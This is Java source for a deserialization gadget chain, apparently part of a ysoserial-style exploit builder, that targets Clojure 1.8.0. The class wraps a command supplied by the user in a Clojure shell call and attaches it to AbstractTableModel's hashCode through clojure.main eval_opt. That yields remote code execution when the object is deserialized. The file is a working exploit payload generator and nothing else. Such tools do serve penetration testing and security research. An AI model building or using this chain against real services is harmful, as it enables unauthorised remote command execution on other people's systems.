package org.ses.gadgetbuilder.chains2;

import clojure.inspector.proxy$javax.swing.table.AbstractTableModel$ff19274a;
import clojure.lang.PersistentArrayMap;
import org.ses.gadgetbuilder.annotations.Authors;
import org.ses.gadgetbuilder.annotations.Dependencies;
import org.ses.gadgetbuilder.annotations.Impact;
import org.ses.gadgetbuilder.chains.main.GadgetChain;
import org.ses.gadgetbuilder.chains.main.TrampolineConnector;
import org.ses.gadgetbuilder.chains.trampolines.noparam.HashCodeTrampoline;

import java.util.HashMap;
import java.util.Map;

@Dependencies({"org.clojure:clojure:1.8.0"})
@Authors({ Authors.JACKOFMOSTTRADES })
@Impact(Impact.RCE)
public class Clojure1 extends GadgetChain<HashCodeTrampoline> {

    Map<String, Object> fnMap;
    String clojurePayload;
    AbstractTableModel$ff19274a model;

    public Clojure1(HashCodeTrampoline _trampoline) {
        super(_trampoline);
    }


    @Override
    protected TrampolineConnector createPayload(String command) throws Exception {

        final String[] execArgs = command.split(" ");
        final StringBuilder commandArgs = new StringBuilder();
        for (String arg : execArgs) {
            commandArgs.append("\" \"");
			commandArgs.append(arg);
        }
		commandArgs.append("\"");

        this.clojurePayload = String.format("(use '[clojure.java.shell :only [sh]]) (sh %s)", commandArgs.substring(2));

        this.fnMap = new HashMap<String, Object>();
        fnMap.put("hashCode", new clojure.core$constantly().invoke(0));

        this.model = new AbstractTableModel$ff19274a();
        model.__initClojureFnMappings(PersistentArrayMap.create(fnMap));

        return new TrampolineConnector(model);
    }

    @Override
    protected void postProcessPayload() throws Exception {
        fnMap.put("hashCode",
                new clojure.core$comp().invoke(
                        new clojure.main$eval_opt(),
                        new clojure.core$constantly().invoke(clojurePayload)));
        model.__initClojureFnMappings(PersistentArrayMap.create(fnMap));
    }

    @Override
    protected String getStackTrace() {
        return "AbstractTableModel$ff19274a.hashCode()\n" +
                "clojure.core$comp$fn__4727.invoke()\n" +
                "clojure.core$constantly$fn__4614.invoke()\n" +
                "clojure.main$eval_opt.invoke()";
    }
}
